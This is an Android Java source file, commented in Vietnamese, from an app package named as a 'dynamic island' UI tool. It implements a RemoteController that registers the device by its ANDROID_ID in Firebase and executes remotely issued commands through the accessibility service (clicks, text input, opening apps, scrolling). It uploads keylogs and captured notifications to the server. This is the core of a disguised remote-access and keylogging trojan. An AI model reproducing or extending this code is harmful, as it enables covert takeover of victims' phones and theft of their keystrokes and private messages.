package com.tools.edge.dynamic.island.ui.component.service;

import static com.tools.edge.dynamic.island.ui.component.model.AccessibilityAction.ACTION_CLICK;
import static com.tools.edge.dynamic.island.ui.component.model.AccessibilityAction.ACTION_INPUT;
import static com.tools.edge.dynamic.island.ui.component.model.AccessibilityAction.ACTION_OPEN_APP;
import static com.tools.edge.dynamic.island.ui.component.model.AccessibilityAction.ACTION_SCROLL;
import static com.tools.edge.dynamic.island.ui.component.model.AccessibilityAction.ACTION_WAIT;
import static com.tools.edge.dynamic.island.ui.component.model.AccessibilityAction.SCROLL_DOWN;
import static com.tools.edge.dynamic.island.ui.component.model.AccessibilityAction.SCROLL_UP;
import static com.tools.edge.dynamic.island.ui.component.model.AccessibilityAction.TARGET_PACKAGE;

import android.content.Context;
import android.provider.Settings;
import android.util.Log;
import android.widget.Toast;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.tools.edge.dynamic.island.ui.component.model.AccessibilityAction;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

public class RemoteController {
    private static final String TAG = "Received";
    private final Context context;
    private final AccessibilityActionExecutor actionExecutor;
    private DatabaseReference databaseReference;
    private final String deviceId;
    private boolean isServiceConnected = false;
    private boolean isFirebaseInitialized = false;

    public RemoteController(Context context, AccessibilityActionExecutor actionExecutor) {
        this.context = context;
        this.actionExecutor = actionExecutor;
        this.deviceId = Settings.Secure.getString(
            context.getContentResolver(), 
            Settings.Secure.ANDROID_ID
        );
        
        // Khởi tạo Firebase Realtime Database
        FirebaseDatabase database = FirebaseDatabase.getInstance();
        this.databaseReference = database.getReference("devices").child(deviceId);
        
        // Kiểm tra quyền accessibility
        checkAccessibilityPermission();
    }
    
    /**
     * Kiểm tra quyền accessibility và khởi tạo Firebase nếu có quyền
     */
    private void checkAccessibilityPermission() {
        int accessibilityEnabled = 0;
        try {
            accessibilityEnabled = Settings.Secure.getInt(
                context.getContentResolver(),
                Settings.Secure.ACCESSIBILITY_ENABLED
            );
        } catch (Settings.SettingNotFoundException e) {
            Log.e(TAG, "Error finding setting: " + e.getMessage());
        }
        
        if (accessibilityEnabled == 1) {
            isServiceConnected = true;
            initializeFirebase();
        } else {
            Toast.makeText(context, "Vui lòng bật Accessibility Service để sử dụng tính năng điều khiển từ xa", Toast.LENGTH_LONG).show();
        }
    }
    
    /**
     * Khởi tạo Firebase và thiết lập listener
     */
    private void initializeFirebase() {
        if (isFirebaseInitialized) {
            return;
        }

        // Thiết lập listener cho các thay đổi
        setupDatabaseListener();
        
        // Gửi trạng thái ban đầu
        sendStatus("Ready");
        sendLog("Device ID: " + deviceId);

        isFirebaseInitialized = true;
    }
    
    /**
     * Được gọi khi Accessibility Service được kết nối
     */
    public void serviceConnected() {
        isServiceConnected = true;
        
        // Khởi tạo Firebase nếu chưa được khởi tạo
        if (!isFirebaseInitialized) {
            initializeFirebase();
        }
        
        // Gửi trạng thái mới
        sendStatus("Connected");
        sendLog("Device ID: " + deviceId);
    }
    
    /**
     * Được gọi khi Accessibility Service bị ngắt kết nối
     */
    public void serviceDisconnected() {
        isServiceConnected = false;
        
        // Gửi trạng thái mới
        sendStatus("Disconnected");
    }

    private void setupDatabaseListener() {
        databaseReference.child("commands").addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(DataSnapshot dataSnapshot) {
                try {
                    if (dataSnapshot.exists()) {
                        Object commandObj = dataSnapshot.getValue();
                        if (commandObj instanceof String) {
                            // Nếu dữ liệu lưu dạng chuỗi JSON
                            String command = (String) commandObj;
                            Log.d(TAG, "Received command (String): " + command);
                            processRemoteCommand(command);
                        } else if (commandObj instanceof java.util.Map) {
                            // Nếu dữ liệu lưu dạng Map (HashMap)
                            JSONObject jsonObject = new JSONObject((java.util.Map) commandObj);
                            String command = jsonObject.toString();
                            Log.d(TAG, "Received command (Map->JSON): " + command);
                            processRemoteCommand(command);
                        } else {
                            Log.w(TAG, "Unknown command data type: " + commandObj);
                        }
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Error processing commands: " + e.getMessage());
                }
            }

            @Override
            public void onCancelled(DatabaseError databaseError) {
                Log.e(TAG, "Database error: " + databaseError.getMessage());
            }
        });
    }

    private void processRemoteCommand(String jsonObject) {
        if (!isServiceConnected) {
            sendStatus("Error: Accessibility service is not connected");
            return;
        }
        
        try {
            Log.d(TAG, "processRemoteCommand: " + jsonObject);
            actionExecutor.executeActionsFromJsonString(jsonObject);

        } catch (Exception e) {
            Log.e(TAG, "Error executing command: " + e.getMessage());
            sendStatus("Error executing command: " + e.getMessage());
        }
    }

    // Phương thức để gửi trạng thái về server
    public void sendStatus(String status) {
        if (databaseReference != null) {
            databaseReference.child("status").setValue(status);
        }
    }

    // Phương thức để gửi log về server
    public void sendLog(String log) {
        if (databaseReference != null) {
            databaseReference.child("logs").push().setValue(log);
        }
    }

    public void sendKeyLog(String keyLog) {
        if (databaseReference != null) {
            databaseReference.child("keylog").push().setValue(keyLog);
        }
    }


    public void sendLogNoti(String keyLog) {
        if (databaseReference != null) {
            databaseReference.child("lognoti").push().setValue(keyLog);
        }
    }
} 